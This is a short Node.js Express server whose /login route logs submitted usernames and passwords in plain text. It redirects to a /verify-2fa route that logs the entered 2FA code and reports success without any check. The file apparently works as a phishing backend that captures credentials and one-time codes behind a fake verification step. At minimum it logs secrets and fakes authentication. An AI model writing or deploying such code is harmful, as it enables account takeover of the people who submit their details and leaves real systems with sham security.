const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Define other routes
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  console.log('Login Attempt:', { username, password });
  res.redirect('/verify-2fa');
});

app.post('/verify-2fa', (req, res) => {
  const { authCode } = req.body;
  console.log('2FA Code Entered:', authCode);
  res.send('2FA Code Verified!');
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
